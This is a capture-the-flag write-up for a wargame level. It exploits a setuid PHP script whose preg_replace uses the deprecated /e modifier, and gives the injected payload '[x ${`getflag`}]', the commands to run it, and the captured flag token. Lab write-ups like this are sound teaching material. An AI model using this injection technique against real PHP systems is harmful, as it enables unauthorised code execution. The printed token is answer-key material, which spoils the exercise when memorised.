# Level06 Writeup

## Objective
Gain access to the `flag06` user and retrieve the password for `level07`.

## Steps Taken

1. **Initial Inspection**  
   Listing files in the home directory revealed:
   ```
   -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
   -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
   ```
   Both files are owned by `flag06` and accessible by `level06`, suggesting they may be exploitable.

2. **Analyzing the PHP Script**  
   The contents of `level06.php`:
   ```php
   #!/usr/bin/php
   <?php
   function y($m) {
       $m = preg_replace("/\./", " x ", $m);
       $m = preg_replace("/@/", " y", $m);
       return $m;
   }
   function x($y, $z) {
       $a = file_get_contents($y);
       $a = preg_replace("/(\[x (.*)\])/e", "y("\\2")", $a);
       $a = preg_replace("/\[/", "(", $a);
       $a = preg_replace("/\]/", ")", $a);
       return $a;
   }
   $r = x($argv[1], $argv[2]);
   print $r;
   ?>
   ```
   - The vulnerable line is:
     ```php
     $a = preg_replace("/(\[x (.*)\])/e", "y("\\2")", $a);
     ```
     It uses the deprecated `e` modifier in regex, which evaluates the match as PHP code — making it vulnerable to code injection.

3. **Exploit Construction**  
   I created a file containing an injected payload:
   ```bash
   echo '[x ${`getflag`}]' > /tmp/getflag
   ```
   Then I executed the PHP wrapper:
   ```bash
   ./level06 /tmp/getflag
   ```

4. **Retrieve the Flag**  
   The output included:
   ```
   PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
   ```
   This confirmed successful code execution and revealed the flag.

## Result
Successfully retrieved the password for `level07`:  
```
wiok45aaoguiboiki2tuin6ub
```
